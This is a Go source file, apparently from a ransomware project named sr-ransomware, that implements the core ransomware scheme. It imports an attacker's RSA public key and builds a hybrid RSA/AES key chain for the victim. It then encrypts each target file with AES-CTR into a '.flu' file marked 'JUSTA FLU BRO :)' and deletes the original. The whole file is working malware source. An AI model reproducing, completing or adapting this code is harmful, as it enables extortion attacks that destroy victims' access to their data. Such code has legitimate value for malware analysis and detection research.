package scheme

import (
    "os"
    "io"
    "io/ioutil"
    "path/filepath"
    "crypto/cipher"
    "crypto/rand"
    "crypto/rsa"
    "crypto/aes"

    "github.com/sug0/sr-ransomware/go/errors"
    "github.com/sug0/sr-ransomware/go/crypto/util"
)

const rsaKeyBits  = 2048

func ImportPublicKey() (*rsa.PublicKey, error) {
    pkData, err := ioutil.ReadFile(filepath.Join(workDir, attackerPublicKey))
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to read RSA public key", err)
    }
    pk, err := util.ImportPEMPublicKeyRSA(pkData)
    return pk, errors.WrapIfNotNil(pkg, "failed to import RSA public key", err)
}

// Generate all the appropriate keys in the malware
// work dir.
func GenerateKeys() error {
    // global rsa key
    pk, err := ImportPublicKey()
    if err != nil {
        return err
    }

    // local rsa keys
    sk, err := util.GenerateKeyRSA(rsaKeyBits)
    if err != nil {
        return errors.Wrap(pkg, "failed to generate RSA secret key", err)
    }
    pkData, err := util.ExportDERPublicKeyRSA(&sk.PublicKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to marshal RSA public key", err)
    }
    err = ioutil.WriteFile(filepath.Join(workDir, victimPublicKey), pkData, 0644)
    if err != nil {
        return errors.Wrap(pkg, "failed to write RSA public key", err)
    }

    // aes key stuff
    aesKey, err := util.GenerateAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES key", err)
    }
    aesIV, err := util.GenerateAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES IV", err)
    }
    aesBlock, _ := aes.NewCipher(aesKey)
    aesCiph := cipher.NewCTR(aesBlock, aesIV)

    // export rsa pub encrypted with aes
    skData, err := util.ExportDERSecretKeyRSA(sk)
    if err != nil {
        return errors.Wrap(pkg, "failed to marshal RSA secret key", err)
    }
    skData = util.Pad(skData, aes.BlockSize)
    aesCiph.XORKeyStream(skData, skData)
    err = ioutil.WriteFile(filepath.Join(workDir, victimSecretKey), skData, 0644)
    if err != nil {
        return errors.Wrap(pkg, "failed to write RSA secret key", err)
    }

    // export aes key encrypted with rsa pub
    ivKey := append(aesIV, aesKey...)
    aesEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, pk, ivKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to encrypt AES key", err)
    }
    err = ioutil.WriteFile(filepath.Join(workDir, victimAESKey), aesEncrypted, 0644)
    if err != nil {
        return errors.Wrap(pkg, "failed to write AES key", err)
    }

    return nil
}

// Encrypt a file.
func EncryptFile(pk *rsa.PublicKey, path string) error {
    err := encryptFile(pk, path)
    if err != nil {
        return err
    }

    // remove original file
    return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
}

func encryptFile(pk *rsa.PublicKey, path string) error {
    // new aes key
    aesKey, err := util.GenerateAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES key", err)
    }
    aesIV, err := util.GenerateAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES IV", err)
    }
    aesBlock, _ := aes.NewCipher(aesKey)
    aesStream := cipher.NewCTR(aesBlock, aesIV)

    // load files
    fOriginal, err := os.Open(path)
    if err != nil {
        return errors.Wrap(pkg, "failed to open file", err)
    }
    defer fOriginal.Close()

    fEncrypted, err := os.Create(path + ".flu")
    if err != nil {
        return errors.Wrap(pkg, "failed to create file", err)
    }
    defer fEncrypted.Close()

    // write magic
    _, err = io.WriteString(fEncrypted, "JUSTA FLU BRO :)")
    if err != nil {
        return errors.Wrap(pkg, "failed to write magic", err)
    }

    // write encrypted AES key
    encryptedKey, err := rsa.EncryptPKCS1v15(rand.Reader, pk, append(aesIV, aesKey...))
    if err != nil {
        return errors.Wrap(pkg, "failed encrypt AES key", err)
    }
    _, err = fEncrypted.Write(encryptedKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to write encrypted AES key", err)
    }

    // write encrypted file
    info, err := fOriginal.Stat()
    if err != nil {
        return errors.Wrap(pkg, "failed to stat file", err)
    }
    padding := util.GeneratePaddingBytes(int(info.Size()), aes.BlockSize)
    stream := cipher.StreamWriter{S: aesStream, W: fEncrypted}
    _, err = io.Copy(stream, fOriginal)
    if err == nil {
        _, err = stream.Write(padding)
    }
    return errors.WrapIfNotNil(pkg, "failed to encrypte file with AES", err)
}
